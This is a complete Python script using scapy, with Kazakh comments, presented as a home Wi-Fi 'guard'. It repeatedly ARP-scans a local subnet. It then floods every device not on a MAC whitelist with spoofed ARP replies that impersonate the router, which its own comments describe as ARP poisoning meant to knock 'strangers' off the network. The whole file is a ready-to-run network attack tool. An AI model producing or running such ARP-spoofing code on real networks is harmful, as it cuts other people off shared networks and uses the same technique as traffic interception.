from scapy.all import ARP, Ether, srp, send
import time

# 1. СЕНІМДІ ҚҰРЫЛҒЫЛАР (WHITELIST)
# Осында өз телефоның мен компьютеріңнің MAC-адрестерін жаз
WHITELIST = [
    "сеңің_mac_адресің", 
    "батяның_mac_адресі"
]

ROUTER_IP = "192.168.8.1" # Beeline роутерінің IP-і

def scan_and_kick():
    print(f"[{time.strftime('%H:%M:%S')}] Күзет жұмыс істеп тұр...")
    
    # Желідегі барлық құрылғыларды табу
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.8.0/24"), timeout=2, verbose=False)
    
    for snd, rcv in ans:
        ip = rcv.psrc
        mac = rcv.hwsrc
        
        if mac not in WHITELIST:
            print(f"‼️ БӨТЕН ТАБЫЛДЫ: {ip} [{mac}]")
            print(f"🚫 ШЫҒАРУ ЖҮРІП ЖАТЫР...")
            # Бөтен құрылғыға "Мен роутермін" деп өтірік айтып, жолын жабамыз
            kick(ip, ROUTER_IP)
        else:
            print(f"✅ Сенімді құрылғы: {ip}")

def kick(target_ip, router_ip):
    # ARP Poisoning: Құрылғыны желіден адастыру
    packet = ARP(op=2, pdst=target_ip, psrc=router_ip, hwdst="ff:ff:ff:ff:ff:ff")
    send(packet, count=10, verbose=False)

while True:
    scan_and_kick()
    time.sleep(5) # Әр 5 секунд сайын тексеру
